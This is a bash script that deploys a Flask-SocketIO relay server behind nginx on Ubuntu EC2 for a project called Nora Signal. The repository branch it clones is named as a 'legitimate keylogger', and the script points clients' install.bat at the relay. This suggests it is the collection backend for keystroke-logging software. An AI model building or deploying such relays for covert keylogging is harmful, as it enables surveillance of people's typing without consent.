#!/bin/bash
# Nora Signal relay server setup for Ubuntu EC2
# Run as root: bash setup-vps.sh
set -euo pipefail

DOMAIN="${1:-}"   # optional: pass your domain as first arg, e.g. bash setup-vps.sh mon.example.com
APP_DIR="/opt/nora"
REPO="https://github.com/smallkhk/Nora-signal"
BRANCH="claude/legitimate-keylogger-lm3rqu"
BIND="127.0.0.1:5050"
SERVICE="nora-relay"

echo "=== 1. System packages ==="
apt-get update -q
apt-get install -y -q python3 python3-pip python3-venv git nginx certbot python3-certbot-nginx

echo "=== 2. Clone / update repo ==="
if [ -d "$APP_DIR/.git" ]; then
  git -C "$APP_DIR" fetch origin "$BRANCH"
  git -C "$APP_DIR" checkout "$BRANCH"
  git -C "$APP_DIR" pull origin "$BRANCH"
else
  git clone --branch "$BRANCH" "$REPO" "$APP_DIR"
fi

echo "=== 3. Python virtualenv ==="
python3 -m venv "$APP_DIR/venv"
"$APP_DIR/venv/bin/pip" install -q --upgrade pip
"$APP_DIR/venv/bin/pip" install -q \
  gunicorn \
  flask flask-socketio \
  gevent gevent-websocket \
  requests

echo "=== 4. Systemd service ==="
cat > /etc/systemd/system/${SERVICE}.service << EOF
[Unit]
Description=Nora Signal relay
After=network.target

[Service]
User=www-data
WorkingDirectory=$APP_DIR
ExecStart=$APP_DIR/venv/bin/gunicorn \\
  --worker-class geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\
  --workers 1 \\
  --bind $BIND \\
  --timeout 120 \\
  --access-logfile $APP_DIR/access.log \\
  --error-logfile $APP_DIR/error.log \\
  relay:app
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

chown -R www-data:www-data "$APP_DIR"
systemctl daemon-reload
systemctl enable "$SERVICE"
systemctl restart "$SERVICE"
sleep 2
systemctl is-active --quiet "$SERVICE" && echo "✓ Gunicorn running" || { echo "✗ Gunicorn failed"; journalctl -u "$SERVICE" -n 20; exit 1; }

echo "=== 5. Nginx ==="
cat > /etc/nginx/sites-available/nora << 'NGINX'
server {
    listen 80;
    server_name _;

    location /socket.io/ {
        proxy_pass http://127.0.0.1:5050/socket.io/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400;
    }

    location / {
        proxy_pass http://127.0.0.1:5050;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
NGINX

ln -sf /etc/nginx/sites-available/nora /etc/nginx/sites-enabled/nora
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx
echo "✓ Nginx running"

echo ""
if [ -n "$DOMAIN" ]; then
  echo "=== 6. SSL ==="
  certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos -m admin@"$DOMAIN" || \
    echo "⚠ Certbot failed — make sure DNS for $DOMAIN points to this server first"
fi

PUBLIC_IP=$(curl -s https://checkip.amazonaws.com || curl -s https://api.ipify.org)
echo ""
echo "=== Done ==="
echo "  Relay URL : http://$PUBLIC_IP  (or https://$DOMAIN if SSL worked)"
echo "  Hub viewer: http://$PUBLIC_IP"
echo "  Logs      : $APP_DIR/error.log"
echo ""
echo "Update NORA_RELAY in install.bat to the URL above."
echo "Test WebSocket:"
echo "  curl --http1.1 -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' \\"
echo "       -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \\"
echo "       'http://$PUBLIC_IP/socket.io/?EIO=4&transport=websocket' 2>&1 | head -5"
